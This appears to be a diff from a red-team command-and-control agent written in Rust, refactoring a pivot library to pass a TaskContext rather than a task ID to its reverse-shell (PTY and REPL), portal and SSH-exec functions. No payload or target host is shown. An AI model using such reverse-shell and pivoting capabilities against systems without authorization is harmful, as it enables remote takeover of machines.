@@ -23,27 +23,28 @@ use std::sync::Arc;
 
 // Deps for Agent
 use eldritch_agent::Agent;
+use pb::c2::TaskContext;
 
 #[derive(Default)]
 #[eldritch_library_impl(PivotLibrary)]
 pub struct StdPivotLibrary {
     pub agent: Option<Arc<dyn Agent>>,
-    pub task_id: Option<i64>,
+    pub task_context: Option<TaskContext>,
 }
 
 impl core::fmt::Debug for StdPivotLibrary {
     fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
         f.debug_struct("StdPivotLibrary")
-            .field("task_id", &self.task_id)
+            .field("task_id", &self.task_context.as_ref().map(|tc| tc.task_id))
             .finish()
     }
 }
 
 impl StdPivotLibrary {
-    pub fn new(agent: Arc<dyn Agent>, task_id: i64) -> Self {
+    pub fn new(agent: Arc<dyn Agent>, task_context: TaskContext) -> Self {
         Self {
             agent: Some(agent),
-            task_id: Some(task_id),
+            task_context: Some(task_context),
         }
     }
 }
@@ -54,10 +55,11 @@ impl PivotLibrary for StdPivotLibrary {
             .agent
             .as_ref()
             .ok_or_else(|| "No agent available".to_string())?;
-        let task_id = self
-            .task_id
-            .ok_or_else(|| "No task_id available".to_string())?;
-        reverse_shell_pty_impl::reverse_shell_pty(agent.clone(), task_id, cmd)
+        let task_context = self
+            .task_context
+            .clone()
+            .ok_or_else(|| "No task context available".to_string())?;
+        reverse_shell_pty_impl::reverse_shell_pty(agent.clone(), task_context, cmd)
             .map_err(|e| e.to_string())
     }
 
@@ -66,11 +68,12 @@ impl PivotLibrary for StdPivotLibrary {
             .agent
             .as_ref()
             .ok_or_else(|| "No agent available".to_string())?;
-        let task_id = self
-            .task_id
-            .ok_or_else(|| "No task_id available".to_string())?;
+        let task_context = self
+            .task_context
+            .clone()
+            .ok_or_else(|| "No task context available".to_string())?;
         agent
-            .start_repl_reverse_shell(task_id)
+            .start_repl_reverse_shell(task_context)
             .map_err(|e| e.to_string())
     }
 
@@ -79,10 +82,11 @@ impl PivotLibrary for StdPivotLibrary {
             .agent
             .as_ref()
             .ok_or_else(|| "No agent available".to_string())?;
-        let task_id = self
-            .task_id
-            .ok_or_else(|| "No task_id available".to_string())?;
-        agent.create_portal(task_id).map_err(|e| e.to_string())
+        let task_context = self
+            .task_context
+            .clone()
+            .ok_or_else(|| "No task context available".to_string())?;
+        agent.create_portal(task_context).map_err(|e| e.to_string())
     }
 
     fn ssh_exec(
